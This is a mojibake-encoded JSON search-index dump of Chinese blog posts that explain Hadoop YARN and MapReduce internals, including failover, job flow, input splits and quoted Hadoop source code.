¹æ®blockæ•°é‡æ¥å®šMapå’ŒReduceçš„è®¡ç®—æ•°é‡ï¼Œç„¶åä¸€èˆ¬çš„Mapæˆ–Reduceå°±å ç”¨ä¸€ä¸ªContainer å¦‚ä½•å‘ç°æ•°æ®çš„æœ¬åœ°åŒ– é€šè¿‡HDFSçš„blockåˆ†ç‰‡ä¿¡æ¯è·å– ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"4. Container èµ„æºç”³è¯·çš„å•ä½å’Œä»»åŠ¡è¿è¡Œçš„å®¹å™¨ï¼š åŸºæœ¬çš„èµ„æºå•ä½ï¼ˆCPUã€å†…å­˜ç­‰ï¼‰ Containerå¯ä»¥åŠ è½½ä»»æ„ç¨‹åºï¼Œè€Œä¸”ä¸é™äºJava ä¸€ä¸ªNodeå¯ä»¥åŒ…å«å¤šä¸ªContainerï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¤§çš„Container ApplicationMasterå¯ä»¥æ ¹æ®éœ€è¦ï¼ŒåŠ¨æ€ç”³è¯·å’Œé‡Šæ”¾Container ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"5. Failover å¤±è´¥ç±»å‹ ç¨‹åºé—®é¢˜ è¿›ç¨‹å´©æºƒ ç¡¬ä»¶é—®é¢˜ å¤±è´¥å¤„ç† ä»»åŠ¡å¤±è´¥ è¿è¡Œæ—¶å¼‚å¸¸æˆ–è€…JVMé€€å‡ºéƒ½ä¼šæŠ¥å‘Šç»™ApplicationMaster é€šè¿‡å¿ƒè·³æ¥æ£€æŸ¥æŒ‚ä½çš„ä»»åŠ¡(timeout)ï¼Œä¼šæ£€æŸ¥å¤šæ¬¡ï¼ˆå¯é…ç½®ï¼‰æ‰åˆ¤æ–­è¯¥ä»»åŠ¡æ˜¯å¦å¤±æ•ˆ ä¸€ä¸ªä½œä¸šçš„ä»»åŠ¡å¤±è´¥ç‡è¶…è¿‡é…ç½®ï¼Œåˆ™è®¤ä¸ºè¯¥ä½œä¸šå¤±è´¥ å¤±è´¥çš„ä»»åŠ¡æˆ–ä½œä¸šéƒ½ä¼šæœ‰ApplicationMasteré‡æ–°è¿è¡Œ ApplicationMasterå¤±è´¥ ApplicationMasterå®šæ—¶å‘é€å¿ƒè·³ä¿¡å·åˆ°ResourceManagerï¼Œé€šå¸¸ä¸€æ—¦ApplicationMasterå¤±è´¥ï¼Œåˆ™è®¤ä¸ºå¤±è´¥ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®å¤šæ¬¡åæ‰å¤±è´¥ ä¸€æ—¦ApplicationMasterå¤±è´¥ï¼ŒResourceManagerä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ApplicationMaster æ–°çš„ApplicationMasterè´Ÿè´£æ¢å¤ä¹‹å‰é”™è¯¯çš„ApplicationMasterçš„çŠ¶æ€(yarn.app.mapreduce.am.job.recovery.enable=true)ï¼Œè¿™ä¸€æ­¥æ˜¯é€šè¿‡å°†åº”ç”¨è¿è¡ŒçŠ¶æ€ä¿å­˜åˆ°å…±äº«çš„å­˜å‚¨ä¸Šæ¥å®ç°çš„ï¼ŒResourceManagerä¸ä¼šè´Ÿè´£ä»»åŠ¡çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤ Clientä¹Ÿä¼šå®šæ—¶å‘ApplicationMasteræŸ¥è¯¢è¿›åº¦å’ŒçŠ¶æ€ï¼Œä¸€æ—¦å‘ç°å…¶å¤±è´¥ï¼Œåˆ™å‘ResouceManagerè¯¢é—®æ–°çš„ApplicationMaster NodeManagerå¤±è´¥ NodeManagerå®šæ—¶å‘é€å¿ƒè·³åˆ°ResourceManagerï¼Œå¦‚æœè¶…è¿‡ä¸€æ®µæ—¶é—´æ²¡æœ‰æ”¶åˆ°å¿ƒè·³æ¶ˆæ¯ï¼ŒResourceManagerå°±ä¼šå°†å…¶ç§»é™¤ ä»»ä½•è¿è¡Œåœ¨è¯¥NodeManagerä¸Šçš„ä»»åŠ¡å’ŒApplicationMasteréƒ½ä¼šåœ¨å…¶ä»–NodeManagerä¸Šè¿›è¡Œæ¢å¤ å¦‚æœæŸä¸ªNodeManagerå¤±è´¥çš„æ¬¡æ•°å¤ªå¤šï¼ŒApplicationMasterä¼šå°†å…¶åŠ å…¥é»‘åå•ï¼ˆResourceManageræ²¡æœ‰ï¼‰ï¼Œä»»åŠ¡è°ƒåº¦æ—¶ä¸åœ¨å…¶ä¸Šè¿è¡Œä»»åŠ¡ ResourceManagerå¤±è´¥ é€šè¿‡checkpointæœºåˆ¶ï¼Œå®šæ—¶å°†å…¶çŠ¶æ€ä¿å­˜åˆ°ç£ç›˜ï¼Œç„¶åå¤±è´¥çš„æ—¶å€™ï¼Œé‡æ–°è¿è¡Œ é€šè¿‡zookeeperåŒæ­¥çŠ¶æ€å’Œå®ç°é€æ˜çš„HA å¯ä»¥çœ‹å‡ºï¼Œä¸€èˆ¬çš„é”™è¯¯å¤„ç†éƒ½æ˜¯ç”±å½“å‰æ¨¡å—çš„çˆ¶æ¨¡å—è¿›è¡Œç›‘æ§ï¼ˆå¿ƒè·³ï¼‰å’Œæ¢å¤ã€‚è€Œæœ€é¡¶ç«¯çš„æ¨¡å—åˆ™é€šè¿‡å®šæ—¶ä¿å­˜ã€åŒæ­¥çŠ¶æ€å’Œzookeeperæ¥Ö¹å®ç°HA ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:5","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"äºŒã€åŸºæœ¬æµç¨‹ YARNçš„åŸºæœ¬æµç¨‹å¯ä»¥ç”¨ä»¥ä¸‹ä¸¤ä¸ªå›¾æ¥è¡¨ç¤ºï¼š 1. Job submission ä»ResourceManagerä¸­è·å–ä¸€ä¸ªApplication ID æ£€æŸ¥ä½œä¸šè¾“å‡ºé…ç½®ï¼Œè®¡ç®—è¾“å…¥åˆ†ç‰‡ æ‹·è´ä½œä¸šèµ„æºï¼ˆjob jarã€é…ç½®æ–‡ä»¶ã€åˆ†ç‰‡ä¿¡æ¯ï¼‰åˆ°HDFSï¼Œä»¥ä¾¿åé¢ä»»åŠ¡çš„æ‰§è¡Œ 2. Job initialization ResourceManagerå°†ä½œä¸šé€’äº¤ç»™Schedulerï¼ˆæœ‰å¾ˆå¤šè°ƒåº¦ç®—æ³•ï¼Œä¸€èˆ¬æ˜¯æ ¹æ®ä¼˜å…ˆçº§ï¼‰Schedulerä¸ºä½œä¸šåˆ†é…ä¸€ä¸ªContainerï¼ŒResourceManagerå°±åŠ è½½ä¸€ä¸ªapplication master processå¹¶äº¤ç»™NodeManagerç®¡ç†ApplicationMasterä¸»è¦æ˜¯åˆ›å»ºä¸€ç³»åˆ—çš„ç›‘æ§è¿›ç¨‹æ¥è·Ÿè¸ªä½œä¸šçš„è¿›åº¦ï¼ŒåŒæ—¶è·å–è¾“å…¥åˆ†ç‰‡ï¼Œä¸ºæ¯ä¸€ä¸ªåˆ†ç‰‡åˆ›å»ºä¸€ä¸ªMap taskå’Œç›¸åº”çš„reduce task Application Masterè¿˜å†³å®šå¦‚ä½•è¿è¡Œä½œä¸šï¼Œå¦‚æœä½œä¸šå¾ˆå°ï¼ˆå¯é…ç½®ï¼‰ï¼Œåˆ™ç›´æ¥åœ¨åŒä¸€ä¸ªJVMä¸‹è¿è¡Œ 3. Task assignment ApplicationMasterå‘Resource Managerç”³è¯·èµ„æºï¼ˆä¸€ä¸ªä¸ªçš„Containerï¼ŒæŒ‡å®šä»»åŠ¡åˆ†é…çš„èµ„æºè¦æ±‚ï¼‰ä¸€èˆ¬æ˜¯æ ¹æ®data localityæ¥åˆ†é…èµ„æº 4. Task execution ApplicationMasteræ ¹æ®ResourceManagerçš„åˆ†é…æƒ…å†µï¼Œåœ¨å¯¹åº”çš„NodeManagerä¸­å¯åŠ¨Container ä»HDFSN#x4E2D;è¯»å–ä»»åŠ¡æ‰€éœ€èµ„æºï¼ˆjob jarï¼Œé…ç½®æ–‡ä»¶ç­‰ï¼‰ï¼Œç„¶åæ‰§è¡Œè¯¥ä»»åŠ¡ 5. Progress and status update å®šæ—¶å°†ä»»åŠ¡çš„è¿›åº¦å’ŒçŠ¶æ€æŠ¥å‘Šç»™ApplicationMaster Clientå®šæ—¶å‘ApplicationMasterè·å–æ•´ä¸ªä»»åŠ¡çš„è¿›åº¦å’ŒçŠ¶æ€ 6. Job completion Clientå®šæ—¶æ£€æŸ¥æ•´ä¸ªä½œä¸šæ˜¯å¦å®Œæˆ ä½œä¸šå®Œæˆåï¼Œä¼šæ¸…ç©ºä¸´æ—¶æ–‡ä»¶ã€ç›®å½•ç­‰ ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-16","objectID":"/2019/10/hadoop3/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(ä¸‰)â€“MapReduce ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"ä¸€ã€ç®€ä»‹ MapReduceæ˜¯ä¸€ç§åˆ†å¸ƒå¼è®¡ç®—æ–¹å¼ï¼ŒæŒ‡å®šä¸€ä¸ªMapå‡½æ•°ï¼ŒæŠŠä¸€ç»„é”®å€¼å¯¹æ˜ å°„æˆä¸€ç»„æ–°çš„é”®å€¼å¯¹ï¼ŒæŒ‡å®šå¹¶å‘çš„Reduceï¼ˆå½’çº¦ï¼‰å‡½æ•°ï¼Œç”¨æ¥ä¿è¯æ‰€æœ‰æ˜ å°„çš„é”®å€¼å¯¹ä¸­çš„æ¯ä¸€ä¸ªå…±äº«ç›¸åŒçš„é”®ç»„ã€‚ å…¶Patternå›¾å¦‚ä¸‹ï¼š map: (K1, V1) â†’ list(K2, V2) combine: (K2, list(V2)) â†’ list(K2, V2) reduce: (K2, list(V2)) â†’ list(K3, V3) Mapè¾“å‡ºæ ¼å¼å’ŒReduceè¾“å…¥æ ¼å¼ä¸€å®šæ˜¯ç›¸åŒçš„ã€‚ ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"äºŒã€æµç¨‹ ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"1. åŸºæœ¬æµç¨‹ MapReduceä¸»è¦æ˜¯å…ˆè¯»å–æ–‡ä»¶æ•°æ®ï¼Œç„¶åè¿›è¡ŒMapå¤„ç†ï¼Œæ¥ç€Reduceå¤„ç†ï¼Œæœ€åæŠŠå¤„ç†ç»“æœå†™åˆ°æ–‡ä»¶ä¸­ã€‚æµç¨‹å›¾å¦‚ä¸‹ï¼š ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"2. è¯¦ç»†æµç¨‹ å¤„ç†çš„è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"3. å¤šèŠ‚ç‚¹ä¸‹çš„æµç¨‹ å¤šèŠ‚ç‚¹çš„æµç¨‹å¦‚ä¸‹ï¼š ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"4. æ•°æ®è§’åº¦æµç¨‹å¤„ç† æ•°æ®æµçš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š Record reader è®°å½•é˜…è¯»å™¨ä¼šç¿»è¯‘ç”±è¾“å…¥æ ¼å¼ç”Ÿæˆçš„è®°å½•ï¼Œè®°å½•é˜…è¯»å™¨ç”¨äºå°†æ•°æ®è§£æç»™è®°å½•ï¼Œå¹¶ä¸åˆ†æè®°å½•è‡ªèº«ã€‚å®ƒå°†æ•°æ®ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¼ è¾“ç»™mapperã€‚é€šå¸¸é”®æ˜¯ä½ç½®ä¿¡æ¯ï¼Œå€¼æ˜¯æ„æˆè®°å½•çš„æ•°æ®å­˜å‚¨å—ã€‚ Map åœ¨æ˜ å°„å™¨ä¸­ç”¨æˆ·æä¾›çš„ä»£ç ç§°ä¸ºä¸­é—´å¯¹ã€‚é”®å†³å®šäº†æ•°æ®åˆ†ç±»çš„ä¾æ®ï¼Œè€Œå€¼å†³å®šäº†å¤„ç†å™¨ä¸­çš„åˆ†æä¿¡æ¯.æœ¬ä¹¦çš„è®¾è®¡æ¨¡å¼å°†ä¼šå±•ç¤ºå¤§é‡ç»†èŠ‚æ¥è§£é‡Šç‰¹å®šé”®å€¼å¦‚ä½•é€‰æ‹©ã€‚ Shuffle and Sort ruduceä»»åŠ¡ä»¥éšæœºå’Œæ’åºæ­¥éª¤å¼€å§‹ã€‚æ­¤æ­¥éª¤å†™å…¥è¾“å‡ºæ–‡ä»¶å¹¶ä¸‹è½½åˆ°æœ¬åœ°è®¡ç®—æœºã€‚è¿™äº›æ•°æ®é‡‡ç”¨é”®è¿›è¡Œæ’åºä»¥æŠŠç­‰ä»·å¯†é’¥ç»„åˆåˆ°ä¸€èµ·ã€‚ Reduce reduceré‡‡ç”¨åˆ†ç»„æ•°æ®ä½œä¸ºè¾“å…¥ã€‚è¯¥åŠŸèƒ½ä¼ é€’é”®å’Œæ­¤é”®ç›¸å…³å€¼çš„è¿­ä»£å™¨ã€‚å¯ä»¥é‡‡ç”¨å¤šç§æ–¹å¼æ¥æ±‡æ€»ã€è¿‡æ»¤æˆ–è€…åˆå¹¶æ•°æ®ã€‚å½“ruduceåŠŸèƒ½å®Œæˆï¼Œå°±ä¼šå‘é€0ä¸ªæˆ–å¤šä¸ªé”®å€¼å¯¹ã€‚ è¾“å‡ºæ ¼å¼ è¾“å‡ºæ ¼å¼ä¼šè½¬æ¢æœ€ç»ˆçš„é”®å€¼å¯¹å¹¶å†™å…¥æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹é”®å’Œå€¼ä»¥tabåˆ†å‰²ï¼Œå„è®°å½•ä»¥æ¢è¡Œç¬¦åˆ†å‰²ã€‚å› æ­¤å¯ä»¥è‡ªå®šä¹‰æ›´å¤šè¾“å‡ºæ ¼å¼ï¼Œæœ€ç»ˆæ•°æ®ä¼šå†™å…¥HDFSã€‚ ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"ä¸‰ã€åˆ†é˜¶æ®µè¿‡ç¨‹è¯¦ç»†åˆ†æ ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"1. Hadoopè¯»å–æ•°æ® é€šè¿‡InputFormatå†³å®šè¯»å–çš„æ•°æ®çš„ç±»å‹ï¼ˆå¯ä»¥æ˜¯æ–‡ä»¶æˆ–æ•°æ®åº“ç­‰ï¼‰ï¼Œç„¶åæ‹†åˆ†æˆInputSplitï¼Œæ¯ä¸ªInputSplitå¯¹åº”ä¸€ä¸ªMapå¤„ç†ï¼ŒRecordReaderè¯»å–InputSplitå†…å®¹ç»™åˆ°Mapã€‚ åŠŸèƒ½ éªŒè¯ä½œä¸šè¾“å…¥çš„æ­£ç¡®æ€§ï¼Œå¦‚æ ¼å¼ç­‰ å°†è¾“å…¥æ–‡ä»¶åˆ‡å‰²æˆé€»è¾‘åˆ†ç‰‡ï¼ˆInputSplitï¼‰ï¼Œä¸€ä¸ªInputSplitåˆ†é…ç»™ä¸€ä¸ªç‹¬ç«‹çš„Mapä»»åŠ¡ æä¾›ReocrdReaderå®ç°ï¼Œè¯»å–InputSplitä¸­çš„â€œK-Vâ€å¯¹ç»™Mapperä½¿ç”¨ æ–¹æ³• List getSplits(): è·å–ç”±è¾“å…¥æ–‡ä»¶è®¡ç®—å‡ºè¾“å…¥åˆ†ç‰‡(InputSplit)ï¼Œè§£å†³æ•°æ®æˆ–æ–‡ä»¶åˆ†å‰²æˆç‰‡é—®é¢˜ RecordReader createRecordReader(): åˆ›å»ºRecordReaderï¼Œä»InputSplitä¸­è¯»å–æ•°æ®ï¼Œè§£å†³è¯»å–åˆ†ç‰‡ä¸­æ•°æ®é—®é¢˜ TextInputFormat: è¾“å…¥æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªè®°å½•ï¼ŒKeyæ˜¯è¿™ä¸€è¡Œçš„byte offsetï¼Œè€Œvalueæ˜¯è¿™ä¸€è¡Œçš„å†…å®¹ KeyValueTextInputFormat: è¾“å…¥æ–‡ä»¶ä¸­æ¯ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªè®°å½•ï¼Œç¬¬ä¸€ä¸ªåˆ†éš”ç¬¦å­—ç¬¦åˆ‡åˆ†æ¯è¡Œã€‚åœ¨åˆ†éš”ç¬¦å­—ç¬¦ä¹‹å‰çš„å†…å®¹ä¸ºKeyï¼Œåœ¨ä¹‹åçš„ä¸ºValueã€‚åˆ†éš”ç¬¦å˜é‡é€šè¿‡key.value.separator.in.input.lineå˜é‡è®¾ç½®ï¼Œé»˜è®¤ä¸º(\\t)å­—ç¬¦ã€‚ NLineInputFormat: ä¸TextInputFormatä¸€æ ·ï¼Œä½†æ¯ä¸ªæ•°æ®å—å¿…é¡»ä¿è¯æœ‰ä¸”åªæœ‰ï¼®è¡Œï¼Œmapred.line.input.format.linespermapå±æ€§ï¼Œé»˜è®¤ä¸ºï¼‘ SequenceFileInputFormat: ä¸€ä¸ªç”¨æ¥è¯»å–å­—ç¬¦æµæ•°æ®çš„InputFormatï¼Œ\u003ckey,value\u003eä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„ã€‚å­—ç¬¦æµæ•°æ®æ˜¯Hadoopè‡ªå®šä¹‰çš„å‹ç¼©çš„äºŒè¿›åˆ¶æ•°æ®æ ¼å¼ã€‚å®ƒç”¨æ¥ä¼˜åŒ–ä»ä¸€ä¸ªMapReduceä»»åŠ¡çš„è¾“å‡ºåˆ°å¦ä¸€ä¸ªMapReduceä»»åŠ¡çš„è¾“å…¥ä¹‹é—´çš„æ•°æ®ä¼ è¾“è¿‡ç¨‹ã€‚\u003c/key,value\u003e **InputSplitï¼š**ä»£è¡¨ä¸€ä¸ªä¸ªé€»è¾‘åˆ†ç‰‡ï¼Œå¹¶æ²¡æœ‰çœŸæ­£å­˜å‚¨æ•°æ®ï¼Œåªæ˜¯æä¾›äº†ä¸€ä¸ªå¦‚ä½•å°†æ•°æ®åˆ†ç‰‡çš„æ–¹æ³• Splitå†…æœ‰Locationä¿¡æ¯ï¼Œåˆ©äºæ•°æ®å±€éƒ¨åŒ–ã€‚ä¸€ä¸ªInputSplitç»™ä¸€ä¸ªå•ç‹¬çš„Mapå¤„ç† public abstract class InputSplit { /** * è·å–Splitçš„å¤§å°ï¼Œæ”¯æŒæ ¹æ®sizeå¯¹InputSplitæ’åº. */ public abstract long getLength() throws IOException, InterruptedException; /** * è·å–å­˜å‚¨è¯¥åˆ†ç‰‡çš„æ•°æ®æ‰€åœ¨çš„èŠ‚ç‚¹ä½ç½®. */ public abstract String[] getLocations() throws IOException, InterruptedException; } ``` **RecordReaderï¼š**å°†InputSplitæ‹†åˆ†æˆä¸€ä¸ªä¸ª\u003ckey,value\u003eå¯¹ç»™Mapå¤„ç†ï¼Œä¹Ÿæ˜¯å®é™…çš„æ–‡ä»¶è¯»å–åˆ†éš”å¯¹è±¡\u003c/key,value\u003e ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"2. é—®é¢˜ å¤§é‡å°æ–‡ä»¶å¦‚ä½•å¤„ç† CombineFileInputFormatå¯ä»¥å°†è‹¥å¹²ä¸ªSplitæ‰“åŒ…æˆä¸€ä¸ªï¼Œç›®çš„æ˜¯é¿å…è¿‡å¤šçš„Mapä»»åŠ¡ï¼ˆå› ä¸ºSplitçš„æ•°ç›®å†³å®šäº†Mapçš„æ•°ç›®ï¼Œå¤§é‡çš„Mapper Taskåˆ›å»ºé”€æ¯å¼€é”€å°†æ˜¯å·¨å¤§çš„ï¼‰ æ€ä¹ˆè®¡ç®—splitçš„ é€šå¸¸ä¸€ä¸ªsplitå°±æ˜¯ä¸€ä¸ªblockï¼ˆFileInputFormatä»…ä»…æ‹†åˆ†æ¯”blockå¤§çš„æ–‡ä»¶ï¼‰ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ä½¿å¾—Mapå¯ä»¥åœ¨å­˜å‚¨æœ‰å½“å‰æ•°æ®çš„èŠ‚ç‚¹ä¸Šè¿è¡Œæœ¬åœ°çš„ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦é€šè¿‡ç½‘ç»œè¿›è¡Œè·¨èŠ‚ç‚¹çš„ä»»åŠ¡è°ƒåº¦ é€šè¿‡mapred.min.split.sizeï¼Œ mapred.max.split.sizeï¼Œblock.sizeæ¥æ§åˆ¶æ‹†åˆ†çš„å¤§å° å¦‚æœmapred.min.split.sizeå¤§äºblock sizeï¼Œåˆ™ä¼šå°†ä¸¤ä¸ªblockåˆæˆåˆ°ä¸€ä¸ªsplitï¼Œè¿™æ ·æœ‰éƒ¨åˆ†blockæ•°æ®éœ€è¦é€šè¿‡ç½‘ç»œè¯»å– å¦‚æœmapred.max.split.sizeå°äºblock sizeï¼Œåˆ™ä¼šå°†ä¸€ä¸ªblockæ‹†æˆå¤šä¸ªsplitï¼Œå¢åŠ äº†Mapä»»åŠ¡æ•°ï¼ˆMapå¯¹splitè¿›è¡Œè®¡ç®—å¹¶ä¸”ä¸ŠæŠ¥ç»“æœï¼Œå…³é—­å½“å‰è®¡ç®—æ‰“å¼€æ–°çš„splitå‡éœ€è¦è€—è´¹èµ„æºï¼‰ å…ˆè·å–æ–‡ä»¶åœ¨HDFSä¸Šçš„è·¯å¾„å’ŒBlockä¿¡æ¯ï¼Œç„¶åæ ¹æ®splitSizeå¯¹æ–‡ä»¶è¿›è¡Œåˆ‡åˆ†ï¼ˆ splitSize = computeSplitSize(blockSize, minSize, maxSize) ï¼‰ï¼Œé»˜è®¤splitSize å°±ç­‰äºblockSizeçš„é»˜è®¤å€¼ï¼ˆ64mï¼‰ public List\u003cInputSplit\u003e getSplits(JobContext job) throws IOException { // é¦–å…ˆè®¡ç®—åˆ†ç‰‡çš„æœ€å¤§å’Œæœ€å°å€¼ã€‚è¿™ä¸¤ä¸ªå€¼å°†ä¼šç”¨æ¥è®¡ç®—åˆ†ç‰‡çš„å¤§å° long minSize = Math.max(getFormatMinSplitSize(), getMinSplitSize(job)); long maxSize = getMaxSplitSize(job); // generate splits List\u003cInputSplit\u003e splits = new ArrayList\u003cInputSplit\u003e(); List\u003cFileStatus\u003e files = listStatus(job); for (FileStatus file: files) { Path path = file.getPath(); long length = file.getLen(); if (length != 0) { FileSystem fs = path.getFileSystem(job.getConfiguration()); // è·å–è¯¥æ–‡ä»¶æ‰€æœ‰çš„blockä¿¡æ¯åˆ—è¡¨[hostname, offset, length] BlockLocation[] blkLocations = fs.getFileBlockLocations(file, 0, length); // åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯åˆ†å‰²ï¼Œé€šå¸¸æ˜¯å¯åˆ†å‰²çš„ï¼Œä½†å¦‚æœæ–‡ä»¶æ˜¯å‹ç¼©çš„ï¼Œå°†ä¸å¯åˆ†å‰² if (isSplitable(job, path)) { long blockSize = file.getBlockSize(); // è®¡ç®—åˆ†ç‰‡å¤§å° // å³ Math.max(minSize, Math.min(maxSize, blockSize)); long splitSize = computeSplitSize(blockSize, minSize, maxSize); long bytesRemaining = length; // å¾ªç¯åˆ†ç‰‡ã€‚ // å½“å‰©ä½™æ•°æ®ä¸åˆ†ç‰‡å¤§å°æ¯”å€¼å¤§äºSplit_Slopæ—¶ï¼Œç»§ç»­åˆ†ç‰‡ï¼Œ å°äºç­‰äºæ—¶ï¼Œåœæ­¢åˆ†ç‰‡ while (((double) bytesRemaining)/splitSize \u003e SPLIT_SLOP) { int blkIndex = getBlockIndex(blkLocations, length-bytesRemaining); splits.add(makeSplit(path, length-bytesRemaining, splitSize, blkLocations[blkIndex].getHosts())); bytesRemaining -= splitSize; } // å¤„ç†ä½™ä¸‹çš„æ•°æ® if (bytesRemaining != 0) { splits.add(makeSplit(path, length-bytesRemaining, bytesRemaining, blkLocations[blkLocations.length-1].getHosts())); } } else { // ä¸å¯splitï¼Œæ•´å—è¿”å› splits.add(makeSplit(path, 0, length, blkLocations[0].getHosts())); } } else { // å¯¹äºé•¿åº¦ä¸º0çš„æ–‡ä»¶ï¼Œåˆ›å»ºç©ºHostsåˆ—è¡¨ï¼Œè¿”å› splits.add(makeSplit(path, 0, length, new String[0])); } } // è®¾ç½®è¾“å…¥æ–‡ä»¶æ•°é‡ job.getConfiguration().setLong(NUM_INPUT_FILES, files.size()); LOG.debug(\"Total # of splits: \" + splits.size()); return splits; } åˆ†ç‰‡é—´çš„æ•°æ®å¦‚ä½•å¤„ç† splitæ˜¯æ ¹æ®æ–‡ä»¶å¤§å°åˆ†å‰²çš„ï¼Œè€Œä¸€èˆ¬å¤„ç†æ˜¯æ ¹æ®åˆ†éš”ç¬¦è¿›è¡Œåˆ†å‰²çš„ï¼Œè¿™æ ·åŠ¿å¿…å­˜åœ¨ä¸€æ¡è®°å½•æ¨ªè·¨ä¸¤ä¸ªsplit â€‹ è§£å†³åŠæ³•æ˜¯åªè¦ä¸æ˜¯ç¬¬ä¸€ä¸ªsplitï¼Œéƒ½ä¼šè¿œç¨‹è¯»å–ä¸€æ¡è®°å½•ã€‚ä¸æ˜¯ç¬¬ä¸€ä¸ªsplitçš„éƒ½å¿½ç•¥åˆ°ç¬¬ä¸€æ¡è®°å½• public class LineRecordReader extends RecordReader\u003cLongWritable, Text\u003e { private CompressionCodecFactory compressionCodecs = null; private long start; private long pos; private long end; private LineReader in; private int maxLineLength; private LongWritable key = null; private Text value = null; // initializeå‡½æ•°å³å¯¹LineRecordReaderçš„ä¸€ä¸ªåˆå§‹åŒ– // ä¸»è¦æ˜¯è®¡ç®—åˆ†ç‰‡çš„å§‹æœ«ä½ç½®ï¼Œæ‰“å¼€è¾“å…¥æµä»¥ä¾›è¯»å–K-Vå¯¹ï¼Œå¤„ç†åˆ†ç‰‡ç»è¿‡å‹ç¼©çš„æƒ…å†µç­‰ public void initialize(InputSplit genericSplit, TaskAttemptContext context) throws IOException { FileSplit split = (FileSplit) genericSplit; Configuration job = context.getConfiguration(); this.maxLineLength = job.getInt(\"mapred.linerecordreader.maxlength\", Integer.MAX_VALUE); start = split.getStart(); end = start + split.getLength(); final Path file = split.getPath(); compressionCodecs = new CompressionCodecFactory(job); final CompressionCodec codec = compressionCodecs.getCodec(file); // æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶å®šä½åˆ°åˆ†ç‰‡è¯»å–çš„èµ·å§‹ä½ç½® FileSystem fs = file.getFileSystem(job); FSDataInputStream fileIn = fs.open(split.getPath()); boolean skipFirstLine = false; if (codec != null) { // æ–‡ä»¶æ˜¯å‹ç¼©æ–‡ä»¶çš„è¯ï¼Œç›´æ¥æ‰“å¼€æ–‡ä»¶ in = new LineReader(codec.createInputStream(fileIn), job); end = Long.MAX_VALUE; } else { // åªè¦ä¸æ˜¯ç¬¬ä¸€ä¸ªsplitï¼Œåˆ™å¿½ç•¥æœ¬splitçš„ç¬¬ä¸€è¡Œæ•°æ® if (start != 0) { skipFirstLine = true; --start; // å®šä½åˆ°åç§»ä½ç½®ï¼Œä¸‹æ¬¡è¯»å–å°±ä¼šä»åç§»ä½ç½®å¼€å§‹ fileIn.seek(start); } in = new LineReader(fileIn, job); } if (skipFirstLine) { // å¿½ç•¥ç¬¬ä¸€è¡Œæ•°æ®ï¼Œé‡æ–°å®šä½start start += in.readLine(new 